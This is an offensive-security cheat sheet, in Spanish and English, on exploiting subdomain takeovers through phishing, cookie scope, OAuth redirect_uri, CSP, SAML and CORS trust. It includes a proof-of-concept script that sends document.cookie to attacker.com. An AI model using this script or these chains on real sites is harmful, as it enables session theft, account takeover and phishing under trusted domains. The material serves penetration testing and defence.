---
aliases:
  - SDT Phishing
  - Cookie Scope Abuse
  - OAuth Trust Transfer
  - CSP Subdomain Bypass
tags:
  - type/cheatsheet
  - vuln/subdomain-takeover
  - technique/initial-access
  - technique/credential-access
  - asset/web-app
primary categories: null
secondary categories: null
tertiary categories: null
type: CheatSheet
linked:
  - '[[Subdomain Takeover]]'
---
# Subdomain Takeover - Vectores de Explotación

***

## Phishing con Subdomain Legítimo

| **Vector** | **Workflow** | **Notas** |
|:---:|:---:|:---:|
| Trust transfer | Subdomain takeover = atacante "es" target.com | Visual + DNS legítimo. |
| Phishing fake login | Atacante hostea fake login en `login.target.com` | Standard credential theft. |
| Fake reset page | Reset URL dirigido a takeover subdomain | High-yield. |
| HTTPS valid cert | Get Let's Encrypt cert for owned subdomain | Padlock visible. |
| Email-style phishing | Send emails con links a `mail-target.target.com` | Email spoofing. |
| OAuth flow phishing | Fake OAuth provider on subdomain | Mass user. |
| Malware distribution | `download.target.com` con malicious bin | High trust binary. |
| Combine con email | "Update at https://account.target.com" → takeover redir | Standard. |
| App store / mobile | Mobile deep links via subdomain | Mobile chain. |
| API endpoint spoofing | `api.target.com` returns malicious | App-level. |
| Mass email campaign | Bulk send con takeover URL | Scale. |
| Brand reputation damage | Defacement visible | Public PR. |
| SEO poisoning | Index'd page con malicious | Long-term. |
| Combine con search engine | Display in Google results legitimately | Reach. |
^sdt-vector-phishing

___

## Cookie Scope Abuse (Domain=`.target.com`)

| **Vector** | **Workflow** | **Notas** |
|:---:|:---:|:---:|
| Concept | Cookies con `Domain=.target.com` enviadas a TODAS subdomains. Atacante con subdomain control reads/sets these cookies. | Standard cookie scope. |
| Read victim's session cookie | Atacante page en takeover sub → JS reads parent domain cookies | If not HttpOnly. |
| Set malicious cookie | Atacante sets cookie en parent domain | Session fixation. |
| CSRF token theft | If CSRF token en cookie con domain wide | CSRF chain. |
| Authentication cookie steal | Direct ATO if session cookie accessible | Major impact. |
| HttpOnly bypass | XSS sub → read cookies inaccessible to fetch but accessible same-site | XSS combo. |
| Subdomain isolation breakage | Apps assume subdomain isolation → atacante breaks | Architectural flaw. |
| Combine con XSS | XSS en takeover sub + parent cookies | Standard chain. |
| Cookie tossing | Atacante sets cookie con specific path → overrides parent | Edge. |
| Combine con CSRF | Cookie set + cross-site request | Combo. |
| `__Host-` prefix immune | Cookies con `__Host-` no permite Domain attr | Defense. |
| `__Secure-` prefix | Less restrictive but HTTPS-only | Defense. |
^sdt-vector-cookie

### PoC cookie steal via takeover

```html
<!-- Atacante hostea en takeover-sub.target.com -->
<script>
  // Cookies del parent domain accessible
  // Si HttpOnly = false
  fetch('https://attacker.com/log', {
    method: 'POST',
    body: document.cookie
  });
</script>
```

Victim navigates a `https://takeover-sub.target.com/x` (atacante's content):
- HTTPS cert valid
- Same registrable domain → cookies de parent enviadas
- JS lee cookies si no HttpOnly
- Exfil a atacante

___

## OAuth `redirect_uri` Trust Transfer

| **Vector** | **Workflow** | **Notas** |
|:---:|:---:|:---:|
| Concept | OAuth IdP whitelists `*.target.com` for redirect_uri. Atacante owns takeover subdomain → claims redirect_uri → receives auth code. | High impact ATO. |
| Wildcard redirect_uri | `*.target.com` allows any subdomain | Standard misconfig. |
| Specific subdomain whitelist | If specific dangling subdomain whitelisted | Direct. |
| Code interception | OAuth code arrives a takeover subdomain | Atacante exchange. |
| Token theft (implicit flow) | `response_type=token` → access_token in fragment | Direct theft. |
| Combine con state CSRF | If state missing | Combine. |
| OpenID nonce reuse | Cross-subdomain trust | Edge. |
| Federated identity (SAML) | Same concept con SAML SP | SAML below. |
| Multiple IdPs | Try multiple OAuth providers | Bulk. |
| Mobile app redirect_uri | Mobile clients also whitelist | Mobile combo. |
| Combine con HHI | If app builds redirect_uri from Host | Compound. |
| Verify with auth audit | Check OAuth/OIDC config of IdP | Pre-auth recon. |
^sdt-vector-oauth

___

## CSP Subdomain Bypass

| **Vector** | **Workflow** | **Notas** |
|:---:|:---:|:---:|
| Concept | CSP `script-src` lists trusted subdomains. Atacante con takeover sub sirve malicious JS → bypass CSP. | XSS via CSP holes. |
| `script-src *.target.com` | Wildcard subdomain → atacante's takeover loads JS | Standard. |
| `script-src cdn.target.com` | If specific subdomain takeover | Direct. |
| Bypass strict CSP via script | Use takeover sub para serve scripts | Common. |
| `style-src` subdomain | CSS injection via takeover | Edge. |
| `frame-src` subdomain | Iframe injection con takeover content | Phishing combo. |
| `connect-src` subdomain | Fetch / WebSocket to takeover | Data exfil. |
| `img-src` subdomain | Image-based exfil/tracking | Beacon. |
| Combine con XSS principal | XSS en main app + takeover sub for JS source | Source chain. |
| Bypass nonce | Subdomain bypasses nonce requirement (in some configs) | Edge. |
| `base-uri` subdomain | Base href hijack via subdomain | Combine HTML inj. |
| Vendor scripts subdomain | Trusted analytics/tracking subdomain | Common. |
^sdt-vector-csp

___

## SAML SP / IdP Trust

| **Vector** | **Workflow** | **Notas** |
|:---:|:---:|:---:|
| Concept | SAML federation trusts specific subdomains as SPs (Service Providers) or IdPs (Identity Providers). Takeover broke trust. | Federated identity. |
| SP ACS URL takeover | Atacante's takeover sub claims as SP | SAML responses arrive a atacante. |
| IdP metadata takeover | If IdP metadata endpoint dangling | Atacante hosts malicious metadata. |
| AssertionConsumerService URL | Subdomain con ACS endpoint takeover | Token receive. |
| SAML logout URL | Logout redirect a takeover | Force logout + phish. |
| SAML single-sign-on URL | Combine con state | Edge. |
| OpenID Connect equivalent | Same concept | Modern. |
| Federation circle of trust | Multi-org SSO | Wider impact. |
| Service-to-service auth | Internal SAML | Hidden vector. |
| Combine con weak SAML signing | Weak crypto + takeover | Compound. |
| Combine con XML signature wrap | XSW + takeover | Edge complex. |
^sdt-vector-saml

___

## CORS Allowlist Abuse

| **Vector** | **Workflow** | **Notas** |
|:---:|:---:|:---:|
| Concept | CORS config trusts subdomains. Atacante takeover sub → atacante's JS makes cross-origin requests con credentials. | CORS bypass. |
| `Access-Control-Allow-Origin: *.target.com` | Wildcard | Standard. |
| `Access-Control-Allow-Credentials: true` con allowed Origin | Cookies sent | High impact. |
| Attacker subdomain origin | Origin: `https://takeover.target.com` | Direct. |
| Read sensitive API data | API trusts subdomain origin → CORS allows fetch with cookies | Data exfil. |
| Trigger sensitive actions | POST to API endpoints | CSRF + CORS. |
| Combine con auth tokens | CSRF token also leaked | Compound. |
| Internal API exposure | Internal-only APIs sometimes trust *.internal.target.com | Lateral. |
| Postmessage origin trust | window.postMessage acceptaria origins | Edge. |
| WebSocket Origin check | WS handshake con Origin header | Real-time. |
| Combine con OAuth | OAuth + CORS misconfig + takeover | Multi-vector. |
| Reflected Origin con preflight | Server reflects Origin → atacante's domain accepted | Common bug. |
^sdt-vector-cors

***
